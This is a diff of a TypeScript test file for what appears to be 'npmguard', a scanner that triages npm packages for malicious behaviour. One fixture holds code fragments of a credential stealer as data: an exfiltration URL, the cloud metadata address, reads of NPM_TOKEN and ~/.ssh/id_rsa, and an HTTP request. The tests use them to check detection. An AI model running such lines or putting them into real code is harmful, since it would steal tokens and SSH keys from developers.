@@ -1,6 +1,13 @@
 import { describe, it, expect } from "vitest";
 import { Hypothesis } from "@npmguard/shared";
-import { buildMapPrompt, draftToHypothesis, MAP_SYSTEM, synthesizeInventoryHypotheses } from "./triage.js";
+import {
+  buildMapPrompt,
+  draftToHypothesis,
+  MAP_SYSTEM,
+  selectTriageFiles,
+  synthesizeSummaryFallback,
+  synthesizeInventoryHypotheses,
+} from "./triage.js";
 import type { PackageIntent } from "./intent-extraction.js";
 import type { InventoryReport } from "../models.js";
 
@@ -256,5 +263,114 @@ describe("synthesizeInventoryHypotheses", () => {
     expect(hyps[0]!.claim.kind).toBe("binary_drop");
     expect(hyps[0]!.severity).toBe("high");
     expect(hyps[0]!.focusFiles).toEqual(["package.json"]);
+  });
+});
+
+describe("synthesizeSummaryFallback", () => {
+  it("turns a critical model summary with empty hypotheses into a credential-theft draft", () => {
+    const fallback = synthesizeSummaryFallback({
+      summary:
+        "This file is a malicious credential stealer. It harvests sensitive environment variables, reads SSH keys and AWS credentials, probes IMDS, and exfiltrates collected data via HTTP POST.",
+      contents: [
+        'const EXFIL_URL = "http://localhost:9999/exfil";',
+        'const IMDS_URL = "http://169.254.169.254/latest/meta-data/";',
+        'if (process.env.NPM_TOKEN) stolen.token = process.env.NPM_TOKEN;',
+        'fs.readFileSync(path.join(os.homedir(), ".ssh", "id_rsa"), "utf-8");',
+        "http.request(options);",
+      ].join("\n"),
+    });
+
+    expect(fallback.capabilities).toEqual(
+      expect.arrayContaining(["CREDENTIAL_THEFT", "ENV_VARS", "NETWORK"]),
+    );
+    expect(fallback.hypotheses).toHaveLength(1);
+    expect(fallback.hypotheses[0]!.claim.kind).toBe("cred_theft");
+    expect(fallback.hypotheses[0]!.severity).toBe("critical");
+    expect(fallback.hypotheses[0]!.rangesInFile.length).toBeGreaterThan(0);
+  });
+
+  it("does not synthesize hypotheses for benign summaries", () => {
+    expect(
+      synthesizeSummaryFallback({
+        summary: "Loads configuration from a local JSON file.",
+        contents: "module.exports = {};",
+      }).hypotheses,
+    ).toEqual([]);
+  });
+});
+
+describe("selectTriageFiles", () => {
+  const inventory: InventoryReport = {
+    metadata: {
+      name: "large-fixture",
+      version: "1.0.0",
+      description: null,
+      license: null,
+      homepage: null,
+      keywords: [],
+      repository: null,
+    },
+    scripts: {},
+    entryPoints: {
+      install: [],
+      runtime: ["dist/index.js"],
+      bin: ["bin/cli.js"],
+    },
+    dependencies: { prod: {}, dev: {}, optional: {}, peer: {} },
+    files: [],
+    flags: [],
+    dealbreaker: null,
+  };
+
+  function file(path: string, sizeBytes = 1000) {
+    return {
+      path,
+      fileType: path.endsWith(".ts") ? "ts" : "js",
+      sizeBytes,
+      permissions: "0644",
+      isBinary: false,
+      binaryType: null,
+    };
+  }
+
+  it("keeps flagged files and entry points when capping large packages", () => {
+    const files = [
+      file("noise/a.js"),
+      file("dist/index.js"),
+      file("noise/b.js"),
+      file("lib/suspicious.js"),
+      file("bin/cli.js"),
+      file("noise/c.js"),
+    ];
+    const flagsByFile = new Map([["lib/suspicious.js", ["[warn] eval-present"]]]);
+
+    const selected = selectTriageFiles({
+      files,
+      inventory,
+      flagsByFile,
+      maxFiles: 3,
+    }).map((f) => f.path);
+
+    expect(selected).toContain("dist/index.js");
+    expect(selected).toContain("bin/cli.js");
+    expect(selected).toContain("lib/suspicious.js");
+    expect(selected).toHaveLength(3);
+  });
+
+  it("preserves original order after selecting highest-priority files", () => {
+    const files = [
+      file("dist/index.js"),
+      file("noise/a.js"),
+      file("bin/cli.js"),
+    ];
+
+    expect(
+      selectTriageFiles({
+        files,
+        inventory,
+        flagsByFile: new Map(),
+        maxFiles: 2,
+      }).map((f) => f.path),
+    ).toEqual(["dist/index.js", "bin/cli.js"]);
   });
 });
